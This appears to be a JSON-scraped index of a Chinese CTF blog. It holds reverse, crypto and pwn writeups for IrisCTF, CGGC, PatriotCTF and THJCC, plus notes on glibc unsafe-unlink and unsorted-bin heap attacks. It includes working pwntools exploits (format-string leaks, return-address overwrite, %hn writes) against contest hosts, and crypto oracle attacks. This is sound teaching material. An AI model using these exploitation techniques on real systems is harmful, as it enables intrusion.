#\r可以搜尋main，找到他\n首先觀察主程式main_main\n可以看到os_Stdout、fmt_Fprint()\n這代表他把v29寫出到標準輸出，也就是輸出函數\n然後看到os_Stdout、fmt_Fscanln()\n這代表他把v29寫入到標準輸入，也就是輸入函數\n那麼從這裡可以看到他是輸出-\u0026gt;輸入-\u0026gt;輸出-\u0026gt;輸入\n可以推測他跟main函數\n接下來進到最主要的encodingString\n*p_string_0是剛剛第二個input，*p_int_0是剛剛一個input\nencodingString #\r首先會先生成金鑰\n透過gdb和decompiler的交互觀察 可以發現他是一個4bytes為單位的陣列，長度會跟s(剛剛傳進來的字串)一樣長，然後裡面會有隨機的byte 有了key之後就可以來逆加密方式了\ns[0] ~ s[len - 1]是 kelpa(剛剛傳入的數字) + (k[i] ^ s[i]) s[len + 1] ~ s[2*len] 是 kelpa + (kelpa(剛剛傳入的數字) + (k[i] ^ s[i])) ^ s[i] s[len]是kelpa 把每個字元utf8 encode hex encode solve #\rfrom pwn import * buf = open(\u0026#39;kelpfile_flag\u0026#39;).read() buf = bytes.fromhex(buf) buf = buf.decode(\u0026#39;utf-8\u0026#39;) buf = [ord(x) for x in buf] slen = len(buf) // 2 xor1 = buf[:slen] kelp = buf[slen] xor2 = buf[slen + 1 :] xor2 = [x - kelp for x in xor2] key = [x ^ y for x, y in zip(xor1, xor2)] plain = [(x - kelp) ^ y for x, y in zip(xor1, key)] print(bytes(plain)) ","date":"2025-01-06","externalUrl":null,"permalink":"/writeups/irisctf-2025/","section":"Writeups","summary":"總排名40/1529|TOP 2%","title":"IrisCTF 2025","type":"writeups"},{"content":" 版本 latest 效果 使目標ptr從指向UAF chunk改為ptr-0x18 unlink的目的為把空閒的heap從雙向陣列中拿出來，這幾種狀況會觸發:\nmalloc() 當在剛好大小符合的 large chunk 中取出 chunk 時 當從比請求大小大的 bin 中取出 chunk 時 free(), malloc_consolidate() 合併前後freed chunk relloc() 合併前向freed chunk unlink_chunk() #\runlink_chunk (mstate av, mchunkptr p) { if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); mchunkptr fd = p-\u0026gt;fd; mchunkptr bk = p-\u0026gt;bk; if (__builtin_expect (fd-\u0026gt;bk != p || bk-\u0026gt;fd != p, 0)) malloc_printerr (\u0026#34;corrupted double-linked list\u0026#34;); fd-\u0026gt;bk = bk; bk-\u0026gt;fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) \u0026amp;\u0026amp; p-\u0026gt;fd_nextsize != NULL) { if (p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != p || p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != p) malloc_printerr (\u0026#34;corrupted double-linked list (not small)\u0026#34;); if (fd-\u0026gt;fd_nextsize == NULL) { if (p-\u0026gt;fd_nextsize == p) fd-\u0026gt;fd_nextsize = fd-\u0026gt;bk_nextsize = fd; else { fd-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; fd-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = fd; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = fd; } } else { p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; } } } 目的 #\runsafe unlink的目標為利用這段unlink_chunk()中的\nfd-\u0026gt;bk = bk; bk-\u0026gt;fd = fd; 可以達成任意讀寫\n三個check #\runlink_chunk()中有三段檢查:\n檢查p-\u0026gt;fd-\u0026gt;bk == p \u0026amp;\u0026amp; p-\u0026gt;bk-\u0026gt;fd == p\nif (__builtin_expect (fd-\u0026gt;bk != p || bk-\u0026gt;fd != p, 0)) malloc_printerr (\u0026#34;corrupted double-linked list\u0026#34;); 檢查當前chunksize是否為下一個chunk的prev_size\nif (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); 檢查非smallbin的chunk，fd_nextsize和bk_nextsize的完整性\nif (!in_smallbin_range (chunksize_nomask (p)) \u0026amp;\u0026amp; p-\u0026gt;fd_nextsize != NULL) if (p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != p|| p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != p) malloc_printerr (\u0026#34;corrupted double-linked list (not small)\u0026#34;); 初始化 #\r我們希望這些chunk的大小會被放到unsorted bin，而不是fastbin或tcache\nuint64_t *ptr0, *ptr1; ptr0 = (uint64_t *)malloc(0x410); ptr1 = (uint64_t *)malloc(0x410); target = ptr0; printf(\u0026#34;chunk_1: %p chunk_2: %p\\n\u0026#34;, ptr0, ptr1); printf(\u0026#34;target: %p\\n\\n\u0026#34;, \u0026amp;target); 這是最初始chunk的狀態\nbypass第一個check #\r現在要做的是，偽造一個fake_chunk在chunk_1 + 0x10\n接著把fake_chunk-\u0026gt;fd 設為target - 0x18\n把fake_chunk-\u0026gt;bk 設為target - 0x10\ntarget[2] = (uint64_t)(\u0026amp;target - 0x3); target[3] = (uint64_t)(\u0026amp;target - 0x2); 然後可以bypass第一個check，因為x-\u0026gt;bk 會相等於x[3]，x-\u0026gt;fd會等同於x[2] bypass第二個和第三個check #\r/* fake a chunk at chunk_1 + 0x10 */ target[0] = 0x0; // fake_chunk prev size target[1] = 0x410; // fake_chunk size /* unset \u0026#34;PREV_INUSE\u0026#34;, faking chunk_1 as freed */ ptr1[-2] = 0x410; // chunk_2 prev size ptr1[-1] = 0x420; // chunk_2 size (can be done with a bug like a heap overflow) target[4] = 0x0; // fd_nextsize free #\r成功觸發了unlink，執行BK-\u0026gt;fd = FD，成功達成目標 reference ","date":"2024-12-24","externalUrl":null,"permalink":"/notes/pwn/heap/13-unsafe-unlink/","section":"Notes","summary":"版本 latest 效果 使目標ptr從指向UAF chunk改為ptr-0x18 unlink的目的為把空閒的heap從雙向陣列中拿出來，這幾種狀況會觸發:","title":"Unsafe Unlink","type":"notes"},{"content":"","date":"2024-12-20","externalUrl":null,"permalink":"/notes/pwn/heap/","section":"Notes","summary":"","title":"Heap Exploitation","type":"notes"},{"content":" 版本 \u0026lt; glibc 2.29 效果 可以把unsorted_chunk (av) 寫到任意位址 __int_malloc() #\r在__int_malloc()有這麼一段程式碼\n/* remove from unsorted list */ unsorted_chunks (av)-\u0026gt;bk = bck; bck-\u0026gt;fd = unsorted_chunks (av); malloc.c: 3777\n其用途可以在unsorted_bin 遍歷過這個chunk的時候將他從double list移除 但我們如果可以控制到bck的位址，那就可以將在隨意位址寫入unsorted_chunks (av)的位址\n初始化 #\runsigned long *ptr0 = malloc(0x410); unsigned long *ptr1 = malloc(0x420); unsigned long *ptr2 = malloc(0x430); 在一開始我們可以看到unsorted_chunks(av)的fd和bk都指向自己 free #\rfree(ptr0); free(ptr2); free(ptr2)單純是方便觀察，如果只free(ptr0)也是可行的\r竄改ptr0-\u0026gt;bk #\r將chunk_1-\u0026gt;bk 竄改為target-0x10\nptr0[1] = (unsigned long)(\u0026amp;target - 0x2); malloc #\rmalloc 跟竄改的chunksize一樣的大小\n小發現 #\r值得一提的是，因為unsorted bin要從尾端拿值出來，所以他會先往bk方向遍歷\n而我們chunk 1的bk已經被控制了(也就是說double linked list的結構崩壞) 所以接下來只要在malloc一次就會崩潰\n要注意使用到函數有調用malloc的(例如第一次呼叫printf)\n","date":"2024-12-20","externalUrl":null,"permalink":"/notes/pwn/heap/11-unsorted-bin-attack/","section":"Notes","summary":"版本 \u0026lt; glibc 2.","title":"Unsorted Bin Attack","type":"notes"},{"content":"這題題目大概是輸入一串密碼，然後會驗證是否正確，若是錯誤會輸出Wrong!\n首先先catch syscall write，因為在輸出的時候大部分都會調用到write\n觀察在輸出Wrong!時的函數堆疊\n我們可以假設這些函數會有其中一個會有判斷是否正確的code\n在1279D這邊我們看到有一段看起來像是call了一個判斷字串的函數\n跟進來，這函數有一個像是迴圈的地方，可以猜測她會逐字元判斷，在裡面下一個斷點\n在這個判斷式下斷點，確保繼續到跑迴圈的步驟 強制跳到下一個instruction(程式會繼續跑到斷點) 成功拿到密碼 ","date":"2024-12-18","externalUrl":null,"permalink":"/notes/reverse/patriotctf-2024-rustlock-upsolve/","section":"Notes","summary":"這題題目大概是輸入一串密碼，然後會驗證是否正確，若是錯誤會輸出Wrong!","title":"PatriotCTF 2024 rustLock upsolve","type":"notes"},{"content":"","date":"2024-12-18","externalUrl":null,"permalink":"/notes/reverse/","section":"Notes","summary":"","title":"Reverse","type":"notes"},{"content":"\r解題狀況 #\r題目 類別 難度 解題人數 S-box Crypto easy 87 Double Secure Crypto medium 15 Shuffle Hell Crypto hard 6 Peek a char Pwn baby 30 Infinite Recursion Pwn easy 16 String Reverser Pwn medium 7 locked unlocker Reverse baby 26 You know I know the token Reverse medium 20 Crypto #\rS-box #\r照著題目加密(編碼)的方式反過來做就好了\nimport base64 Sbox = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16 ] cipher = \u0026#34;b16e45b3d1042f9ae36a0033edfc966e00202f7f6a04e3f5aa7fbec7fc23b17f6a04c75033d12727\u0026#34; cipher = bytes.fromhex(cipher) cipher = bytes(Sbox.index(x) for x in cipher) print(base64.b64decode(cipher)) Double Secure #\r用 e1 和 e2 的最大公因數是 5，所以可以利用共模攻擊把密文縮小成$m^5$，接下來開五次方根就好(我這題的明文設定比較小，可以直接開)\ne1 = 1209025818292500404898024570102134835095 e2 = 1153929820462595439034404807036436005695 c1 = 4686969000176026668142551386405961667244859179091121048789736906319941206633368871603145429789804371517689356724283665615560419220177217061394369109032009837191125570576846003108252054213375517032484936845780176686933021970145944560459910327622173020309196808011289898102369838733513418146248658989833278092245380865500885392466881751439285395948238009780473347394659944225592468491712528382644789159487141824834194698492402509087503284719144175312666038356726647193088410263987334692755831485297259782624493401642724771270618297865273123703684979261387018227373334239613596003448973775510791973553008257272497892749 c2 = 4540297725647331934905237578525216933722595392057237387765407038665230894240204449563209528605647399587374057758620064845160826850834874467466530861889560413716585086967111655199675352965186359605631990782795548688731835329324787086713207234310139569584697775020172181261458867670514322407445943849794394018705433792059849432137048644507043691822321644399785134843330851574379509992140526187868643908531989419115511712486580846719021178555911841665639917213314488825408038260194522914413314352194951861955128509119794766550025992304177755307541355358904591704417309739263026201100425174159070619496076319761127905668 N1 = 11420597945352267246439779981835090037584588491333824626568197775824677557983731463999644894256311021271206322607582216071165117622146217906890462896203921594569439126093578932039659911878686760877479642041356645143332405857507389323442882056801119450744273463542565842985280903907124378453694724227573952940417047614706433822120334077857109663307700994132011851819444180430364772330302858685124576318444033580802013232598348692547021765596536182348708233890220359057622400728625965211209475438433527929412147434590769144689739875814457228384363203070599776289032593445885983011907135099807893621393301265616707684237 N2 = 11420597945352267246439779981835090037584588491333824626568197775824677557983731463999644894256311021271206322607582216071165117622146217906890462896203921594569439126093578932039659911878686760877479642041356645143332405857507389323442882056801119450744273463542565842985280903907124378453694724227573952940417047614706433822120334077857109663307700994132011851819444180430364772330302858685124576318444033580802013232598348692547021765596536182348708233890220359057622400728625965211209475438433527929412147434590769144689739875814457228384363203070599776289032593445885983011907135099807893621393301265616707684237 from gmpy2 import iroot from Crypto.Util.number import * def egcd(a : int, b : int) -\u0026gt; list[int, int]: if a % b: y, x = egcd(b, a % b) y += -x * (a // b) return x, y else: return 0, 1 x, y = egcd(e1, e2) m_5 = pow(c1, x, N1) * pow(c2, y, N1) % N1 m, is_exact = iroot(m_5, 5) print(long_to_bytes(m)) Shuffle Hell #\r加密的示意圖(範圍縮小到 5*2)\n我們知道的是，每一個亂數被使用兩次，而 output 總共為奇數行 這時我們把他們全部 xor 在一起，你會發現每兩個重複的東西對消之後，只會剩下一個 flag\n示意圖\ndef xor(a:bytes, b:bytes)-\u0026gt;bytes: return bytes([x ^ y for (x, y) in zip(a, b)]) output = open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;).read().splitlines() output = [bytes.fromhex(x) for x in output] flag = output[0] for cipher in output[1:]: flag = xor(flag, cipher) print(flag) Reverse #\rlocked unlocker #\r把locked-unlocker.cpython-310.pyc丟pylingual\n然後得到原始碼\n# Decompiled with PyLingual (https://pylingual.io) # Internal filename: locked-unlocker.py # Bytecode version: 3.10.0rc2 (3439) # Source timestamp: 2024-12-11 16:20:53 UTC (1733934053) from Crypto.Cipher import AES from Crypto.Util.Padding import unpad, pad from Crypto.Util.number import * from alive_progress import alive_bar import os import base64 def unlocker(flag): def key_decryptor(ciphertext): c = bytes_to_long(ciphertext) d, n = (4603658780130581148915150220140209357434260720334171947464689689224115300059937591491927995062520871182721152309555936186188185035076128871154176204124793514488557135527608149566977491036337996020603266806593099534710926378143104232680282934708674028324260888928513479725201124908012923904062814280083965953750643748874417922582990140581447104359883546013632213300372709405906550337422870294600571797967308415692350001319846044256769035867042602480100026693980959744730774080841251147954497640746424227114619107029951275270629539250178389315031881132314376397792737912223417817283255802028819736850652480289527248653, 14685324189506833621633107811016252161507381106280877435920825902296463588222347526580992212821242654402628189774220851293950600274703541388602153608650600757314994840159301791101046669751690593584924618968298465038031150257696014704169759196495613034523586560122072909260185257877656023066467007032069256593620750388889071255396806113069316347621756002927816606636249046941467604400177054039626140807225420227261522033732114158666152651006219442012006311015952815775894832796122883380450008664854141360533664966008511126694845625115250782538509459001723387038076625393501801355685209507943320132574334321194302347333) m = pow(c, d, n) plaintext = long_to_bytes(m) return b\u0026#39;\\x00\u0026#39; * (48 - len(plaintext)) + plaintext print(\u0026#39;Starting decryption...\u0026#39;) with alive_bar(256, title=\u0026#39;Decrypting\u0026#39;) as bar: for i in range(256): now_key = key_decryptor(flag[-256:]) flag = flag[:-256] cipher = AES.new(key=now_key[:32], mode=AES.MODE_CBC, iv=now_key[32:]) flag = cipher.decrypt(flag) flag = unpad(flag, 16) bar() print(\u0026#34;Decryption complete! Saving output to \u0026#39;flag.png\u0026#39;.\u0026#34;) with open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(flag) serial_number = input(\u0026#39;Enter the serial number to unlock this product: \u0026#39;) if serial_number == \u0026#39;WA4Au-l10ub-18T7W-u9Yx2-Ms4Rl\u0026#39;: print(\u0026#39;Unlocking...\u0026#39;) unlocker(open(\u0026#39;flag.png.locked\u0026#39;, \u0026#39;rb\u0026#39;).read()) else: print(\u0026#39;Invalid serial number. Access denied.\u0026#39;) 最後你只要直接執行unlocker(open(\u0026lsquo;flag.png.locked\u0026rsquo;, \u0026lsquo;rb\u0026rsquo;).read())就可以得到flag.png了\nYou know I know the token #\r解法 1 #\r首先你透過 ida 打開他，大概分析一下原始碼會發現，你不能生成Administrator的 token\n直接把這邊的 jnz 改成 jz\n這樣就可以在輸入 Administrator 的時候不會被擋住\n解法二 #\r你可以先假設這些複雜的加密、雜湊算法不是開發者自己寫的\n而在對稱加密、雜湊算法中會用到一些常數，而這些常數通常是固定的\n然後把這些常數拿去 google，你就會發現它是sha256\n直接拿去生 token\nPwn #\rPeek a char #\r這題的關鍵在於沒有限制陣列 index 的範圍\n先亂戳戳，然後戳出 flag\n可以用 pwntool 加速這個過程\nfrom pwn import * from tqdm import trange r = remote(\u0026#34;23.146.248.230\u0026#34;, 12343) r.sendlineafter(b\u0026#34;Enter your input: \u0026#34;, b\u0026#34;hokak\u0026#34;) flag = b\u0026#34;\u0026#34; for i in trange(-100, 0): r.sendlineafter(b\u0026#34;Enter the index of the character you want to inspect: \u0026#34;, str(i).encode()) r.recvuntil(f\u0026#34;The character at index {i} is \u0026#39;\u0026#34;.encode()) flag += (r.recv(1)) print(flag) Infinite Recursion #\r我們知道fsb這個函數有 format string bug\n然後bof有 buffer overflow\n所以這題可以透過fsbleak 出 return address\n再計算出main+116，也就是在沒有無限遞迴情況下，rand_fun的 return address\n在執行 printf 之前，rsp+0x18會存放著 fsb 的 return address:rand_fun+35\n使用 payload:%9$p可以 leak 出來\n接下來計算 offset\n得出main+116 = rand_fun+35 - 0x2d9 + 0x366\nfrom pwn import * r = remote(\u0026#34;23.146.248.230\u0026#34;, 12355) r.recvuntil(b\u0026#34;Try to escape haha \u0026gt;:)\\n\u0026#34;) while b\u0026#34;fsb\u0026#34; not in r.recvuntil(b\u0026#39;\u0026gt; \u0026#39;): r.sendline(b\u0026#34;a\u0026#34;) r.sendline(b\u0026#34;%9$p\u0026#34;) rand_fun_addr = int(r.recv(14).decode(), 16) payload = b\u0026#34;a\u0026#34; * 8 * 3 + p64(rand_fun_addr - 0x2d9 + 0x366) while b\u0026#34;bof\u0026#34; not in r.recvuntil(b\u0026#39;\u0026gt; \u0026#39;): r.sendline(b\u0026#34;a\u0026#34;) r.sendline(payload) r.interactive() String Reverser #\r在 format string 中，\u0026quot;%xc%y$hn\u0026quot;可以把第y個參數所指向的值的最低兩個 byte 改成x\n知道這點後，我們在可以尋找一條長得像 A -\u0026gt; B -\u0026gt; C 的資料，在這邊我main function 傳遞的argv chain\n和這條所指的B -\u0026gt; C\n假設target是我們欲改值的位址\n寫入0xbeef #\r利用A -\u0026gt; B -\u0026gt; C這條把C改成target\n再利用B -\u0026gt; C這條把target的最低兩個 byte 改成0xbeef\n寫入0xdead #\r重複剛剛的動作，但把C改成target + 2\n再寫入0xdead\nfrom pwn import * r = remote(\u0026#34;23.146.248.230\u0026#34;, 12321) payload = \u0026#34;%{}$p\u0026#34;.format(0x6 + 0x7) r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) rsp = r.recv(16).decode().strip() rsp = int(rsp, 16) - 0x25 * 0x8 print(f\u0026#34;rsp address: {hex(rsp)}\u0026#34;) target_addr = (rsp + 0xc) # rsp + 0x38 -\u0026gt; rsp + 0x128 \u0026lt;- data payload = \u0026#39;%{}c%{}$hn\u0026#39;.format(target_addr \u0026amp; 0xFFFF, 0x6 + 0x7).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) payload = \u0026#39;%{}c%{}$hn\u0026#39;.format(0xbeef, 0x6 + 0x25).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) payload = \u0026#39;%{}c%{}$hn\u0026#39;.format((target_addr + 2) \u0026amp; 0xFFFF, 0x6 + 0x7).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) payload = \u0026#39;%{}c%{}$hn\u0026#39;.format(0xdead, 0x6 + 0x25).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) r.interactive() 看不懂可以參考這篇\n心得 #\r這次 THJCC 在比賽之前一周，我看著有些類別還空空的就用我的題目把它填滿了\n所以你會看到很多Author: Dr.dog\n因為也時間比較急迫的關係導致難度控的比較差，也寫不出比較複雜的題目\n下次可以期待一下會有更大包的Reverse題，更花式的Pwn還有更複雜的Crypto\n預告:\nnext time will be harder\n","date":"2024-12-18","externalUrl":null,"permalink":"/posts/thjcc-2024-winter/","section":"Posts","summary":"解題狀況 #\r題目 類別 難度 解題人數 S-box Crypto easy 87 Double Secure Crypto medium 15 Shuffle Hell Crypto hard 6 Peek a char Pwn baby 30 Infinite Recursion Pwn easy 16 String Reverser Pwn medium 7 locked unlocker Reverse baby 26 You know I know the token Reverse medium 20 Crypto #\rS-box #\r照著題目加密(編碼)的方式反過來做就好了","title":"THJCC 2024 winter 出題心得","type":"posts"},{"content":"\rIntro #\rReverse #\rlazy7 #\r題目有一個壓縮資料的function\n和一個把資料轉成16進位的function\n題目大概會這樣使用這些function\n題目檔案大概會做這件事\n壓縮-\u0026gt;hex encode-\u0026gt;壓縮-\u0026gt;hex encode\n但仔細觀察你會發現他有把解壓縮和hex decode的function寫在檔案裡面\n所以只要做這件事就好了\nhex decode-\u0026gt;解壓縮-\u0026gt;hex decode-\u0026gt;解壓縮\n#include \u0026#34;defs.h\u0026#34; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; _BYTE sub_140C(long long a1, int a2, long long a3) { long long v3; // rdx int v4; // eax _BYTE *result; // rax int v7; // [rsp+20h] [rbp-18h] int i; // [rsp+24h] [rbp-14h] int j; // [rsp+28h] [rbp-10h] long long v10; // [rsp+2Ch] [rbp-Ch] int v11; // [rsp+34h] [rbp-4h] v7 = 0; for ( i = 0; i \u0026lt; a2; ++i ) { v3 = 12LL * i; v10 = *(_QWORD *)(v3 + a1); v11 = *(_DWORD *)(v3 + a1 + 8); for ( j = 0; j \u0026lt; SHIDWORD(v10); ++j ) { *(_BYTE *)(v7 + a3) = *(_BYTE *)(v7 - (int)v10 + a3); ++v7; } v4 = v7++; *(_BYTE *)(a3 + v4) = v11; } result = (_BYTE *)(v7 + a3); *result = 0; return result; } long long sub_1642(const char *a1, void **a2) { int v3; // [rsp+14h] [rbp-1Ch] BYREF int v4; // [rsp+18h] [rbp-18h] BYREF int v5; // [rsp+1Ch] [rbp-14h] BYREF int i; // [rsp+20h] [rbp-10h] unsigned int v7; // [rsp+24h] [rbp-Ch] unsigned long long v8; // [rsp+28h] [rbp-8h] v7 = strlen(a1) / 0xA; *a2 = malloc(12LL * (int)v7); for ( i = 0; i \u0026lt; (int)v7; ++i ) { sscanf(\u0026amp;a1[10 * i], \u0026#34;%4X%4X%2X\u0026#34;, \u0026amp;v3, \u0026amp;v4, \u0026amp;v5); *((_DWORD *)*a2 + 3 * i) = v3; *((_DWORD *)*a2 + 3 * i + 1) = v4; *((_BYTE *)*a2 + 12 * i + 8) = v5; } return v7; } int main() { void *comp2; void *comp1; char *de1; char *de2; long long len; len = sub_1642(output, \u0026amp;comp2); de1 = (char *)malloc(0x100000); sub_140C((long long)comp2, len, (long long)de1); const char *output = \u0026#34;000000003000010007360000000039000A000835000B00013000150007340000000032000A000946001E00093200320008370001000130003D00073300450008300032000142003C000937005A0009370064000946005A0009310078000331003B0004340000000045007800093300820009350096000938008C000935006900073\u0026#34;...(略) len = sub_1642(de1, \u0026amp;comp1); de2 = (char *)malloc(0x100000); sub_140C((long long)comp1, len, (long long)de2); printf(\u0026#34;result: %s\\n\u0026#34;, de2); FILE *fp = fopen(\u0026#34;flag\u0026#34;, \u0026#34;wb\u0026#34;); // 開啟文件以寫入二進制模式 fwrite(de2, 1, strlen(de2), fp); // 寫入數據 fclose(fp); free(comp2); free(de1); free(de2); return 0; } 把拿到的東西拿去base64decode就可以得到flag.png了:D\nUnityFlagChecker #\r可以先把GameAssembly.dll用il2cppdumper彈出原本的資訊\n這邊有一個checkstring，是加密後的flag，然後被base64 encode後\n這邊有一堆function，雖然不能看到裡面的內容，但可以看到他的VA\n用ida開啟原本的GameAssembly.dll，然後分析裡面的東西，可以發現他是使用chacha20\n最後用x64 dbg在這個function設breakpoint，這會使他再加密前停止 停在這裡 這邊r8是存要加密的資料的指標，選擇跟進後可以看到他的memory 接著把這段改成加密後的flag(base64decoded) r9改成flag的長度(0x36) 然後continue，flag就會出來了 ","date":"2024-11-10","externalUrl":null,"permalink":"/writeups/cggc-2024/","section":"Writeups","summary":"Intro #\rReverse #\rlazy7 #\r題目有一個壓縮資料的function","title":"CGGC 2024 初賽","type":"writeups"},{"content":"\rIntro #\rranking #\r團隊總排名33/1360|2%\nsolves(personal) #\rCategory solves Crypto 4/10 Reverse 2/10 我跟隊友說好我要打Crypto然後我就真的只去戳Crypto\n結果居然沒讓我算到數學，幾乎打得都是對稱加密QwQ\n最後看Reverse好像解題數有點少就去幫忙消化幾題\n在解的過程中，隊伍一度衝到前30\n其實我原本應該是會去打pwn的，但時間已經很晚了\n雖然看到pwn的解題數還是很低，不過為了我的肝我就不碰了\n這次的題目我覺得出得很棒，學到了很多酷東西\nCrypto #\rHard to implement #\r解法 #\r重複多次\nencryption AES(ECB_MODE, 128bits) data user_input + flag 解法 #\rAES prepend oracle:\n假設使用者輸入000000000000000\n密文的第一個block會是000000000000000 + flag的第一個字\n輸入00000000000000\n密文的第一個block則會是00000000000000 + flag的前兩個字\n於是我們可以透過窮舉最後一個字元，並驗證密文是否相等\n000000000000000a\n000000000000000b\n000000000000000c\n\u0026hellip;\n000000000000000p\n以此類推其他求出接下來的字元\n00000000000000pa\n00000000000000pb\n\u0026hellip;\nsolve:\nfrom pwn import * from tqdm import * r = remote(\u0026#39;chal.competitivecyber.club\u0026#39;, 6002) pretends = [] for i in range(15, 1, -1): r.sendlineafter(b\u0026#39;Send challenge \u0026gt; \u0026#39; ,b\u0026#39;0\u0026#39; * i) r.recvuntil(b\u0026#39;Response \u0026gt; \u0026#39;) pretend = bytes.fromhex(r.recv(32).decode()) pretends.append(pretend) oracle = b\u0026#39;\u0026#39; for i, pretend in enumerate(pretends): for byte in trange(0x20, 0x7f): payload = b\u0026#39;0\u0026#39; * (15 - i) + oracle + bytes([byte]) r.sendlineafter(b\u0026#39;Send challenge \u0026gt; \u0026#39; , payload) r.recvuntil(b\u0026#39;Response \u0026gt; \u0026#39;) response = bytes.fromhex(r.recv(32).decode()) if response == pretend: oracle += bytes([byte]) print(oracle.decode()) break High Roller #\r解法 #\r用時間當seed，生成公私鑰，並寫出到一個.pem檔 解法 #\r可以透過檔案的最後修改時間獲得seed\nsolve:\nimport os from Crypto.Util.number import * from Crypto.PublicKey import RSA import random filetime = os.path.getmtime(\u0026#34;public_key.pem\u0026#34;) with open(\u0026#34;public_key.pem\u0026#34;, \u0026#34;rb\u0026#34;) as key_file: public_key = RSA.import_key(key_file.read()) origin_N = public_key.n e = public_key.e d = 0 random.seed(int(filetime)) p, q = getPrime(512, random.randbytes), getPrime(512, random.randbytes) n = p*q phi = (p-1)*(q-1) assert n == origin_N d = pow(e, -1 , phi) assert d * e % phi == 1 C = bytes_to_long(open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read()) flag = long_to_bytes(pow(C, d, n)) print(flag) bit by bit #\r解法 #\r把明文的每16個字元分成一個chunk\n有一把key, 一個個iv\n每次對一個chunk，用key + iv進行xor加密\n每次結束後，iv = (iv + 1) % 256\n解法 #\r用xortool可以先得到key的前15bytes\nsolve:\nfrom pwn import * from Crypto.Util.number import * import sys blocksize = 16 def transmit(): key = bytes_to_long(b\u0026#39;\\x00\\x00\\x00\\x00\\xae\\xcdK\\x13\\x90E#\\xeai\\xba\\xfe\\x00\u0026#39;) iv = 0 msg = open(\u0026#39;cipher.txt\u0026#39;, \u0026#39;rb\u0026#39;).read() chunks = [msg[i:i+16] for i in range(0,len(msg), 16)] send = b\u0026#39;\u0026#39; for chunk in chunks: iv = (iv+1) % 255 curr_k = b\u0026#39;\\x00\u0026#39; * 4 + long_to_bytes(key+iv) plain = xor(curr_k, chunk) send += plain print(send.decode()) sys.exit(0) if __name__==\u0026#34;__main__\u0026#34;: transmit() protected console #\rbtw這題因為這邊連線速度太慢，主辦方幫忙代跑腳本\n解法 #\r多次加密\nencryption AES(CBC_MODE, 128bits) data user_hex_input[16:] iv user_hex_input[:16] 